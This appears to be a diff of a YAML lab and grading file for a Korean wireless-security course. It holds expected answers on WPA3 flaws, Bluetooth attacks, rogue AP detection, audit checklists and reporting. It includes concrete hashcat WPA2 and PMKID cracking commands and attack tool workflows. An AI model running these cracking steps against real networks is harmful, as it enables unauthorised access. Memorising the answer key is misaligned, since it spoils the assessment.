+        도출 시 timing/cache side-channel. 해석: WPA3 출시 6개월 후 발견. 패치됨 (2019-04).
+        modern firmware 안전. IoT 잔존."
+      - "전환 모드 (Transition) — WPA2/WPA3 동시 지원. 출력: WPA2 client 도 동일 SSID 접속.
+        해석: backward compat. 단 WPA2 client 는 WPA2 보안 수준 (downgrade attack
+        가능). 진정 안전 = WPA3 Only Mode."
+      - "PMF (Protected Management Frames) WPA3 의무 — deauth/disassoc 에 MIC. 해석: WPA2
+        에서는 optional, WPA3 mandatory. KRACK 의 일부 전제 (M3 deauth 강제) 차단. 합쳐서
+        deep defense."
       negative_signs:
-      - Forward Secrecy 없음
+      - Forward Secrecy 없음 (개념 인식 X)
       - 오프라인 vs 온라인 비교 없음
       - SAE 용어 누락
+      - Dragonfly DH 메커니즘 무지
+      - PMF 인식 X (WPA3 의 mandatory 보호)
   target_vm: attacker
 - order: 11
   instruction: Bluetooth 공격 기법(BlueBorne, BlueSmack, KNOB)의 개요를 정리하라.
@@ -402,13 +654,38 @@ steps:
       - 공격 3개 이상 (BlueBorne/KNOB/BIAS 등)
       - CVE 또는 영향 명시
       acceptable_methods:
-      - BlueBorne/KNOB/BIAS/BlueSmack
-      - ubertooth-one + crackle
-      - btlejack
+      - "BlueBorne (CVE-2017-0785, Armis 2017) — 페어링 불필요 + 사용자 상호작용 X +
+        Bluetooth ON 만으로 RCE. 영향: Linux/Android/Windows/iOS 53억 device. 패치:
+        2017 가을. 해석: 8 vulns 결합. SDP/L2CAP/BNEP 다층 결함. 가시거리 ~10m → 방향성
+        안테나 확장 가능."
+      - "KNOB (CVE-2019-9506, Antonioli 2019) — Key Negotiation Of Bluetooth.
+        attacker 가 MitM 위치에서 encryption key 길이 1 byte 강제. 해석: 1 byte = 256 조합
+        → 즉시 brute force. 모든 BR/EDR Bluetooth (1.0~5.x) 영향. 패치 2019-08."
+      - "BIAS (CVE-2020-10135, Antonioli 2020) — Bluetooth Impersonation. 페어링된 device
+        위장. 해석: Secure Connections 인증 우회. 'role 변경' 단계 결함. 패치 2020-05.
+        IoT (스피커/이어폰) 잔존."
+      - "BlueSmack — L2CAP echo (ping) 패킷 오버사이즈 (>= 600 byte). 출력: 대상 Bluetooth
+        stack crash. 해석: Bluetooth 의 ping-of-death. 1990s 네트워크 ICMP smash 와 동일
+        패턴. 1 line python script 로 PoC."
+      - "도구 — ubertooth-one (40-2400 MHz BLE/BR sniffer, $120 hardware) + crackle
+        (LE pairing crack). 해석: 학술/실전 도구. ubertooth-rx → pcap 캡처 → crackle 로
+        LE secret key 복원. BLE 이전 spec 영향."
+      - "btlejack (Damien Cauquil) — Mike Ryan 의 btle hijack 도구 후속. 출력: BLE
+        connection hijack + sniff. 해석: BLE only. micro:bit 또는 BBC bbcmicro 호환
+        firmware. 저비용 ($10) BLE pentest."
+      - "BlueZ + bluetoothctl (Linux) — sudo bluetoothctl + scan on + devices. 출력:
+        주변 Bluetooth 장비 nearby list. 해석: standard Linux Bluetooth stack. discovery
+        모드 device → MAC + name + service 식별. 사전 정찰."
+      - "방어 — 1) firmware 업데이트 (BlueBorne/KNOB/BIAS 모두 패치). 2) Bluetooth 비사용 시
+        OFF (가장 효과). 3) Secure Connections (SC) 만 사용 (BR/EDR 4.0+). 4) BLE LE
+        Secure Connections (4.2+). 5) random device address (privacy). 해석: 5중 방어.
+        firmware 가 가장 빠른 효과."
       negative_signs:
-      - 공격 2개 이하
+      - 공격 2개 이하 (3+ 필수)
       - CVE 누락
-      - 방어 없음
+      - 방어 없음 (firmware/disable/SC 인식 X)
+      - 도구 (ubertooth/btlejack) 무시
+      - 가시거리 / 방향성 안테나 맥락 없음
   target_vm: attacker
 - order: 12
   instruction: 무선 네트워크 보안 감사 체크리스트를 작성하라.
@@ -439,13 +716,35 @@ steps:
       - 5개 카테고리 (Encryption/Auth/AP/Monitoring/Physical)
       - 체크리스트 항목 형식
       acceptable_methods:
-      - NIST SP 800-153
-      - PCI DSS Wireless
-      - ISO 27001 A.8 보안
+      - "5 카테고리 체크리스트 (수기 baseline) — Encryption + Authentication + AP Configuration
+        + Monitoring + Physical. 출력: '[ ] WPA3-SAE 사용 / [ ] PMF 활성 / [ ] WPS 비활성
+        / [ ] WIDS 배포 ...'. 해석: PTES Pentest Execution Standard 의 Wireless Pentest
+        섹션 형식. 인증 가능한 audit deliverable."
+      - "NIST SP 800-153 (Wireless LAN Security) — federal 표준. 출력: 'STIG 권고 항목
+        38개'. 해석: 미국 정부 무선 보안 표준. 군/연방 환경 필수. SP 800-97 (RSN), SP
+        800-119 (IPv6) 와 함께."
+      - "PCI DSS Wireless 요구사항 — Section 4.1.1 (전송 시 강력 암호화), 11.1 (Rogue AP
+        탐지). 출력: 'PCI DSS v4.0 Compliant'. 해석: 카드 결제 인프라. 무선 네트워크가 카드
+        데이터 환경 (CDE) 인접 시 필수. 분기별 audit."
+      - "ISO 27001 Annex A.8 (자산 관리) + A.13 (통신 보안) — 무선 네트워크 자산 인벤토리 +
+        암호화 정책. 해석: international standard. ISMS 인증 받으려면 무선 정책 문서화 필수."
+      - "OWASP Wireless Testing Guide — owasp.org/www-project-wireless-security-testing-guide.
+        해석: open-source pentest 가이드. 단계별 (recon → exploit → post → report).
+        교육 자료로 우수."
+      - "WPS 비활성 (필수) — bash command: 'sudo iwconfig wlan0 wps off' (실 환경) 또는
+        router web UI. 해석: WPS PIN brute (Reaver) 1초 PoC. 모든 router 비활성 필수.
+        체크리스트 의 '[ ] WPS 비활성' 단일 항목으로 가장 큰 보안 향상."
+      - "Rogue AP 탐지 (Monitoring) — Aruba ClearPass / Cisco WIPS / open-source Kismet.
+        해석: 무선 IDS. 정기 BSSID 화이트리스트 + 새 BSSID 알림. enterprise 표준."
+      - "Physical security — AP 위치 (외벽 가까이 X), 신호 강도 조정 (cell breathing),
+        AP 도난 방지 (Kensington lock). 해석: 무선 신호의 외부 누출 = 물리 침투 entry. 위치
+        + 강도 = 보안 + 사용자 경험 trade-off."
       negative_signs:
-      - 카테고리 3개 이하
-      - 체크리스트 형식 없음
-      - WPS 비활성 누락
+      - 카테고리 3개 이하 (5 카테고리 미만)
+      - 체크리스트 형식 없음 (서술형만)
+      - WPS 비활성 누락 (가장 흔한 실수)
+      - 표준 framework (NIST/PCI/ISO) 인용 없음
+      - Rogue AP 탐지 누락
   target_vm: attacker
 - order: 13
   instruction: Rogue AP 탐지 방법을 설명하고, 간단한 탐지 스크립트의 로직을 작성하라.
@@ -474,13 +773,35 @@ steps:
       - 탐지 방법 3개 이상
       - Kismet/WIPS 도구 언급
       acceptable_methods:
-      - BSSID whitelist + 신호 분석
-      - Kismet rogue detection
-      - WIPS (Aruba/Cisco)
+      - "BSSID whitelist (수기 baseline) — for bssid in $(airodump-ng wlan0mon | awk
+        '/BSSID/{print $1}'); do grep -q $bssid known_aps.txt || echo \"ROGUE: $bssid\";
+        done. 해석: 알려진 AP MAC 목록 vs 현재 스캔 결과. 미등록 BSSID = rogue. 가장
+        간단/효과적."
+      - "신호 강도 이상 — airodump-ng 의 PWR 컬럼 매트릭스. 해석: 정상 AP 의 RSSI 분포
+        baseline (예: -50 ± 10 dBm). 갑자기 -30 dBm (가까이 등장) 또는 -90 (희미한 fake)
+        = rogue 의심. 시간 기반 추적."
+      - "채널 중첩 — 같은 SSID 의 다른 채널 (예: real AP ch 6, rogue AP ch 11). 해석:
+        roaming 가정에 위배. 동일 ESSID 의 BSSID 가 여러 채널 = 의심. ESSID/BSSID/Channel
+        3축 매트릭스."
+      - "Vendor OUI 불일치 — MAC 의 첫 3 byte = 제조사. 정상 AP (Aruba, Cisco) vs rogue
+        (라즈베리 파이 / TP-Link 의 SOHO chipset). 해석: 회사 표준 vendor 외 = 의심.
+        macvendors.com / IEEE OUI registry 조회."
+      - "Kismet rogue alert — kismet.conf 의 alert filter. 출력: Kismet WEB UI 의 Rogue
+        AP 알림. 해석: Kismet 자동 baseline 학습 + 새 BSSID 알림. 무료 도구 + Wazuh 연동."
+      - "Wazuh wireless event — siem.fast.log 의 'Suricata: Wireless Anomaly' 룰. 해석:
+        Suricata 가 wireless 패킷 모니터링 시 rogue 탐지 alert. SIEM 통합. correlation +
+        대응."
+      - "Aruba ClearPass + WIPS — enterprise 솔루션. 해석: 자동 deauth 차단 + 모니터링.
+        24/7 모니터. Cisco WIPS, Mojo Networks 동급."
+      - "탐지 스크립트 로직 (수기 작성) — bash + airodump CSV: while read line; do bssid=...;
+        if [[ ! \" $WHITELIST \" =~ $bssid ]]; then alert; fi; done. 해석: 5 line bash
+        스크립트로 baseline rogue 탐지. cron 5분마다 실행."
       negative_signs:
-      - 탐지 방법 1개 이하
-      - 도구 없음
-      - Evil Twin 구분 없음
+      - 탐지 방법 1개 이하 (다중 신호 결합 X)
+      - 도구 없음 (Kismet/WIPS 무시)
+      - Evil Twin 구분 없음 (동일 SSID + 다른 BSSID 인식 X)
+      - vendor OUI 인식 X
+      - 자동화 (cron + Wazuh) 누락
   target_vm: attacker
 - order: 14
   instruction: hashcat을 사용한 WPA2 핸드셰이크 GPU 크래킹 명령과 성능을 정리하라.
@@ -511,13 +832,35 @@ steps:
       - -m 22000 모드 + hcxpcapngtool 변환
       - GPU vs CPU 속도 비교
       acceptable_methods:
-      - hashcat -m 22000
-      - hashcat -a 3 mask
-      - rules + wordlist 조합
+      - "hashcat -m 22000 GPU (수기 baseline) — hcxpcapngtool capture.pcapng -o hash.hc22000
+        && hashcat -m 22000 hash.hc22000 rockyou.txt --status. 출력: Speed.#1: 2500000
+        H/s (RTX 4090) / Recovered: 1/1 (100.00%). 해석: -m 22000 = unified WPA hash
+        mode (PMKID + EAPOL 통합)."
+      - "hcxpcapngtool 변환 — hcxpcapngtool capture.pcapng -o hash.hc22000 -E essidlist.
+        해석: aircrack 의 .cap → hashcat 의 22000 형식. 패키지: hcxtools (Github ZerBea).
+        ESSID 리스트 추출 옵션."
+      - "hashcat -a 3 mask attack — hashcat -m 22000 hash -a 3 ?u?l?l?l?l?l?d?d.
+        출력: 8자 (Upper+Lower×5+Digit×2) 30B 조합. 해석: 정확 패턴 알 때. RTX 3080 30분
+        완주. Random 보다 효율 ↑."
+      - "rules + wordlist — hashcat -m 22000 hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule.
+        해석: 14M 단어 × 64 변형 = 896M 시도. P@ssw0rd / Password!1 / password2024 등.
+        실 사용자 비번 패턴."
+      - "GPU vs CPU 매트릭스 — RTX 4090: 2.5M H/s / RTX 3080: 1.1M / RTX 3060: 50K /
+        i7 CPU: 10K. 해석: 1세대 차이 50배. 8자 mixed (2.7년 RTX 3060) → (5일 RTX 4090).
+        GPU 투자 정당화."
+      - "분산 크래킹 — hashtopolis (open-source). 해석: 여러 GPU 머신 분산. 1주 작업 →
+        1일. 클라우드 GPU (AWS p4d.24xlarge 8x A100) 가격 vs 시간 trade-off."
+      - "12자 mixed (한계) — 26+26+10+33 = 95 chars × 12 자리 = 5.4 quintillion. RTX
+        4090 = 68만 년. 해석: 12자 이상 무작위 = 사실상 불가능. WPA2 PSK 보안 권고."
+      - "PMKID 공격 (효율 ↑) — hcxdumptool 으로 PMKID 추출 → hashcat -m 22000. 해석: 핸드셰이크
+        4 패킷 캡처 불필요. AP 의 첫 association response 만으로 hash. 2018 atom 발표.
+        client 없는 AP 도 OK."
       negative_signs:
-      - 변환 단계 누락
-      - mode 없음
-      - 성능 비교 없음
+      - 변환 단계 누락 (.cap → .hc22000 해석 없음)
+      - mode 없음 (-m 22000)
+      - 성능 비교 없음 (GPU vs CPU)
+      - mask attack 무시
+      - PBKDF2 4096 iteration / iteration count 인식 X
   target_vm: attacker
 - order: 15
   instruction: 무선 네트워크 공격 실습 결과를 /tmp/wireless_report.txt에 정리하라. 프로토콜별 위험도, 공격 시나리오,
@@ -553,13 +896,36 @@ steps:
       - Risk + Scenarios + Recommendations 3섹션
       - 프로토콜별 위험도 + 권고 5개 이상
       acceptable_methods:
-      - echo > 보고서 + 위험도 매트릭스
-      - PTES Wireless 보고서
-      - NIST SP 800-153 권고
+      - "3섹션 보고서 (수기 baseline) — echo -e '=== Wireless Attack Report ===\\n\\n[Risk]
+        WEP CRITICAL / WPA-TKIP HIGH / WPA2-PSK MEDIUM / WPA2-Enterprise LOW / WPA3
+        LOW.\\n\\n[Scenarios] 5개 attack 실측.\\n\\n[Recommendations] 8개 권고.' > /tmp/wireless_report.txt.
+        해석: PTES + OWASP Wireless Testing Guide 형식."
+      - "위험도 매트릭스 (Risk Assessment) — 5 프로토콜 × (Likelihood / Impact / Severity)
+        3 컬럼. 출력: WEP=Critical (5분 crack) / WPA-TKIP=High / WPA2-PSK=Medium / WPA3=Low.
+        해석: 정량 risk score. 보고서 의 핵심 결론."
+      - "공격 시나리오 5개 — 1) WPA2 handshake → rockyou 크래킹. 2) Evil Twin + captive
+        portal. 3) Deauth DoS + 강제 reconnect. 4) Rogue AP 침투. 5) Bluetooth BlueBorne/KNOB.
+        해석: 학생이 직접 시연한 5 사례. 각 시나리오 1 문단."
+      - "권고 8개 — WPA3-SAE 도입 / WPA2-Enterprise (RADIUS) / 강한 PSK (20자+) / 802.11w
+        PMF 활성 / WPS 비활성 / WIDS/WIPS 배포 / wireless 와 internal 분리 / 정기 audit.
+        해석: 실무 즉시 적용 가능 8 항목. 회사 IT 정책 PR 근거."
+      - "PTES Wireless 보고서 형식 — pentest-standard.org 의 'Reporting' 섹션. 출력:
+        Executive Summary / Findings / Recommendations / Appendix. 해석: 컨설팅 deliverable
+        표준. 클라이언트 제출 가능 quality."
+      - "NIST SP 800-153 권고 — STIG (Security Technical Implementation Guide) 의 38개
+        권고 인용. 해석: 미국 정부 표준. 회사 권고도 NIST 매핑 시 설득력 ↑."
+      - "MITRE ATT&CK 매핑 — T1011 (Exfiltration over Other Network), T1040 (Network
+        Sniffing), T1557.002 (ARP Cache Poisoning). 해석: 각 무선 공격을 ATT&CK 기법으로
+        분류. Defender 가 detection rule 매핑 가능."
+      - "PDF 변환 + 무결성 — pandoc /tmp/wireless_report.txt -o report.pdf; sha256sum
+        report.pdf > report.sha256; gpg --sign report.pdf. 해석: 변조 방지. 클라이언트
+        제출 시 무결성 검증. PCI/ISO audit 표준."
       negative_signs:
-      - 3섹션 중 1개 이하
-      - 권고 3개 이하
-      - 위험도 평가 없음
+      - 3섹션 중 1개 이하 (Risk/Scenarios/Recommendations 부족)
+      - 권고 3개 이하 (8개 권장)
+      - 위험도 평가 없음 (CRITICAL/HIGH/MEDIUM/LOW 분류 X)
+      - MITRE 매핑 없음
+      - 표준 framework 인용 X
   target_vm: attacker
 - order: 99
   instruction: |
@@ -646,15 +1012,83 @@ steps:
       - 환경 3종 체크리스트 (라운지/기내/직원)
       - 실 명령 (iw dev / 4WHS)
       acceptable_methods:
-      - heredoc Navigator JSON
-      - markdown table
-      - 체크리스트 box
-      - 가상 환경 명령
+      - "시간 도장 + 컨설턴트 헤더 — date '+%Y-%m-%dT%H:%M:%S%z' >
+        /tmp/aerosec_assessment.log; echo '=== AeroSec Senior Consultant — 인천공항 라운지
+        Wi-Fi 점검 ===' | tee -a /tmp/aerosec_assessment.log; echo '발주처: 인천국제공항공사 IT
+        보안팀 / 평가 범위: T1 라운지 (공유 PSK)·기내 Wi-Fi·직원 백본' | tee -a /tmp/aerosec_assessment.log.
+        해석: 컨설팅 deliverable 의 시간 무결성 (감사 요건). 페르소나·범위 명시는 ISO 27001
+        A.5.31 (법적/계약 요구사항) 충족. lecture w13 학습목표 → 산업 컨설팅 전환."
+      - "Kill Chain 7 ↔ ATT&CK 매핑 표 (heredoc) — cat <<'EOF' > /tmp/kc_mitre.md
+        | KC | Tactic | Wi-Fi 기법 | TID |
+        | 1 Recon | TA0043 | BSSID/SSID 정찰 | T1590.005 |
+        | 2 Weaponization | TA0042 | Evil Twin AP 준비 | T1583.005 |
+        | 3 Delivery | TA0001 | Deauth + Twin 유인 | T1557.001 |
+        | 4 Exploitation | TA0006 | KRACK key reinstall | T1557.004 |
+        | 5 Installation | TA0003 | Rogue AP 상주 | T1078 |
+        | 6 C2 | TA0011 | 캡처 → 외부 채널 | T1071 |
+        | 7 Actions | TA0009 | 트래픽 sniffing | T1040 |
+        EOF. 해석: Lockheed Martin Kill Chain 7 단계 ↔ MITRE ATT&CK Tactic/Technique 1:1+ 매핑.
+        TID 가 T15xx 계열 (network + adversary-in-the-middle) 로 무선 트랙 정확히 짚음.
+        14 주 통합 lab #4(WPA2)·#6(Twin)·#9(KRACK)·#13(Rogue) 행위 증명."
+      - "Navigator Layer JSON 산출 (heredoc) — cat <<'EOF' > /tmp/aerosec_layer.json
+        {\"name\":\"AeroSec Airport Wi-Fi 2026-04-29\",\"versions\":{\"attack\":\"16\",\"navigator\":\"5.1.0\",\"layer\":\"4.5\"},\"domain\":\"enterprise-attack\",\"description\":\"공항
+        라운지 Wi-Fi 14주 통합\",\"filters\":{\"platforms\":[\"Network\",\"Linux\",\"Windows\"]},\"techniques\":[{\"techniqueID\":\"T1590.005\",\"score\":100,\"color\":\"#ff6666\"},{\"techniqueID\":\"T1583.005\",\"score\":100,\"color\":\"#ff6666\"},{\"techniqueID\":\"T1557.001\",\"score\":100,\"color\":\"#ff6666\"},{\"techniqueID\":\"T1557.004\",\"score\":100,\"color\":\"#ff6666\"},{\"techniqueID\":\"T1040\",\"score\":100,\"color\":\"#ff6666\"},{\"techniqueID\":\"T1071\",\"score\":50,\"color\":\"#ffcc66\"},{\"techniqueID\":\"T1190\",\"score\":75,\"color\":\"#ff9966\"}],\"metadata\":[{\"name\":\"course\",\"value\":\"attack-w13\"},{\"name\":\"scenario\",\"value\":\"airport-lounge\"}],\"showTacticRowBackground\":true,\"tacticRowBackground\":\"#dddddd\"}
+        EOF. 해석: ATT&CK Navigator 5.1.0 Layer 4.5 스키마 준수 — versions·domain·techniques[]·metadata
+        4 필드 필수. score 100 = 확정 기법, 50/75 = 부분/조건부. import 가능 양식 (mitre-attack/attack-navigator
+        공식 schema 호환)."
+      - "JSON 검증 (jq) — jq . /tmp/aerosec_layer.json | head -20; jq '.techniques |
+        length' /tmp/aerosec_layer.json; jq '.versions' /tmp/aerosec_layer.json. 출력: pretty
+        JSON + technique 개수 (7) + versions 객체. 해석: Navigator 가 거부하는 가장 흔한
+        실수 = JSON 깨짐·versions 누락·techniqueID 오타. jq 가 schema 1차 검증 (구문) +
+        techniques 배열 길이로 deliverable 완성도 정량화. 7+ 권장 (Kill Chain 7단계 1:1
+        대응)."
+      - "환경별 체크리스트 3종 — cat <<'EOF' >> /tmp/aerosec_assessment.log
+        [A 라운지 (공유 PSK)] WPA3-SAE 강제 / Client Isolation / Captive HTTPS / 802.11w PMF / 공유 PSK 폐기 / WIDS 24h
+        [B 기내] Per-passenger PSK 발급 / DoH 강제 / VPN passthrough 차단 / 안내 (peer-to-peer 위험)
+        [C 직원 백본] 802.1X EAP-TLS / RADIUS+MFA / Bluetooth 패치 / Rogue AP 탐지 (Kismet)
+        EOF. 해석: 라운지·기내·직원 3 신뢰 도메인별 차등 통제 (NIST SP 800-153 Wireless 권고).
+        라운지=untrusted 다중 사용자 → SAE+Isolation, 기내=tenant 분리, 직원=
+        certificate-based EAP-TLS. 일률적 권고 X."
+      - "가상 환경 명령 시뮬레이션 — `iw dev 2>/dev/null || ip link show 2>&1 | grep -E
+        'wlan|wlp' | head -5 || echo '[가상: wlan0/wlan1]'`; echo '[Wi-Fi 진화] WEP RC4 → WPA
+        TKIP → WPA2 AES-CCMP → WPA3 SAE'; echo '[aircrack-ng] airmon-ng / airodump-ng / aireplay-ng /
+        aircrack-ng / airbase-ng'; echo '[4WHS] M1 ANonce → M2 SNonce+MIC → M3 GTK+MIC → M4 ACK'.
+        해석: attacker VM 에 무선 NIC 없음 (가상 환경) → 명령 골격만 시뮬레이션. 실 무선
+        공격 = 정보통신망법 위반. lecture w13 의 4-Way Handshake 4 메시지·aircrack-ng 5 도구
+        ·프로토콜 진화 핵심 키워드 검증."
+      - "Non-AI 트랙 명시 (Bastion AI 통합 차이) — echo '=== 트랙 명시 ===' >> /tmp/aerosec_assessment.log;
+        echo '본 평가는 Non-AI 트랙 — ssh ccc@10.20.30.201 (attacker VM) 직접 실행' >> /tmp/aerosec_assessment.log;
+        echo 'AI 트랙 비교: nl2cmd \"공항 Wi-Fi 점검 자동화\" → Bastion 이 Navigator JSON 자동 생성·정책 매핑
+        + KG context 활용' >> /tmp/aerosec_assessment.log; echo '본 트랙은 컨설턴트 자력 작성 능력 검증' >>
+        /tmp/aerosec_assessment.log. 해석: P19 attack-nonai 트랙은 도구·명령·산출물 자력 작성
+        검증. AI 트랙 비교는 평가 보고서에서 reproducibility 차이 (수동 = 학습효과·증거 보존, AI =
+        속도·일관성) 명시."
+      - "PDF 변환 + 무결성 서명 — pandoc /tmp/aerosec_assessment.log -o
+        /tmp/aerosec_report.pdf 2>/dev/null || echo '[pandoc 없음 — txt 제출]';
+        sha256sum /tmp/aerosec_report.pdf 2>/dev/null > /tmp/aerosec_report.sha256;
+        gpg --armor --detach-sign /tmp/aerosec_report.pdf 2>/dev/null || echo '[gpg key
+        없음 — sha256 only]'; ls -l /tmp/aerosec_report*. 해석: 컨설팅 deliverable
+        는 변조 방지 무결성 (PCI-DSS 12.10·ISO 27001 A.5.34) 필수. SHA-256 해시 + GPG
+        분리 서명 = 발주처 검증 가능 형태. 실패 시 graceful degrade (txt 제출)."
+      - "Navigator import 검증 절차 — echo '=== Navigator Import 절차 ===' | tee
+        /tmp/import_steps.md; echo '1. mitre-attack.github.io/attack-navigator 접속 (offline:
+        attack-navigator-app docker)' | tee -a /tmp/import_steps.md; echo '2. Open Existing Layer
+        → Upload from local → /tmp/aerosec_layer.json' | tee -a /tmp/import_steps.md;
+        echo '3. heatmap 7 TID 색상 (red=확정 / orange=부분) 검증' | tee -a /tmp/import_steps.md;
+        echo '4. screenshot → /tmp/aerosec_navigator.png 첨부 → 발주처 PDF 보고서 동봉' | tee
+        -a /tmp/import_steps.md. 해석: Navigator JSON 은 단순 텍스트 산출물이 아니라
+        UI 시각화·heatmap 발표·범위 협의 도구. import 4 단계는 클라이언트 워크숍 표준
+        절차 (MITRE D3FEND 권장)."
       negative_signs:
-      - JSON 형식 깨짐
-      - Kill Chain 누락
-      - 환경 1종만
-      - 실 무선 공격 시도 (정통망법)
+      - JSON 형식 깨짐 (jq 파싱 실패·versions 누락·techniqueID 오타)
+      - Kill Chain 7 단계 누락 (3 단계 이하 매핑)
+      - 환경 1종만 작성 (라운지·기내·직원 차등 X)
+      - 실 무선 공격 시도 (aireplay-ng 실 명령 — 정보통신망법 위반)
+      - 시간 도장 누락 (date 명령 없음)
+      - 컨설턴트 페르소나 / 발주처 명시 누락
+      - Navigator versions 필드 누락 (import 거부됨)
+      - 무결성 서명 단계 누락 (sha256sum / gpg X)
+      - Non-AI 트랙 명시 X (AI 트랙과 구분 불가)
   target_vm: attacker
   risk_level: low
   answer_detail: |
